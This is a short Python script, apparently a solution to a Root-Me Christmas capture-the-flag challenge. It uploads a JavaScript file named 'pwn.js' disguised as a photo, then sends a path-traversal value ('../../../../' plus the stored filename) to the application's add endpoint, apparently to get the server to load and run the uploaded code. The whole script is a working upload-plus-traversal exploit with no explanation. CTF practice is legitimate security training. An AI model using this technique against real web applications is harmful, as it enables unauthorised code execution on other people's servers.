import requests
import json

url = 'http://dyn-01.xmas.root-me.org:36038'

files = {'photo': open('pwn.js','rb')}
values = {'name': 'Exploit'}

r = requests.post(url + '/api/suggest', files=files, data=values)

print(r.text)

filename = json.loads(r.text)["photoPath"]

r = requests.post(url + '/api/add', data={'product': '../../../../' + filename[:-3]})

print(r.text)
